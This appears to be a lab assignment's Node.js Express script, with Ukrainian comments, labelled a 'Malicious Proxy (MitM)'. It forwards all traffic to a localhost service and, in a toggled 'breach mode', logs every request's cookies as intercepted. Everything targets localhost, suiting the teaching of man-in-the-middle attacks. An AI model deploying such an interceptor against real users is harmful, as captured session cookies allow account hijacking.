const express = require('express');
const axios = require('axios'); // Переконайтеся, що axios встановлено: npm install axios
const app = express();
const PORT = 8080;
const TARGET_URL = 'http://localhost:3000';

// Змініть isBreachMode на true, щоб активувати перехоплення даних (Task 1.2)
let isBreachMode = false;

app.all('*', async (req, res) => {
    if (isBreachMode) {
        // Breach Mode (The Sniffer): Intercepts and logs the Cookie header[cite: 3]
        console.log("--- MITM ATTACK: INTERCEPTED COOKIES ---");
        console.log("Cookies:", req.headers.cookie || "No cookies found");
        console.log("-----------------------------------------");
    }

    try {
        // Forwarding the request to GoodHost (Port 3000)[cite: 3]
        const response = await axios({
            method: req.method,
            url: `${TARGET_URL}${req.url}`,
            data: req.body,
            headers: { ...req.headers, host: 'localhost:3000' },
            validateStatus: () => true, // Forward all status codes
            responseType: 'arraybuffer' // Handle potential binary data (images, etc.)
        });

        // Sending the response back to the browser[cite: 3]
        res.set(response.headers);
        res.status(response.status).send(response.data);
    } catch (error) {
        res.status(500).send("Proxy error: " + error.message);
    }
});

app.listen(PORT, () => {
    console.log(`Malicious Proxy (MitM) is running on http://localhost:${PORT}`);
});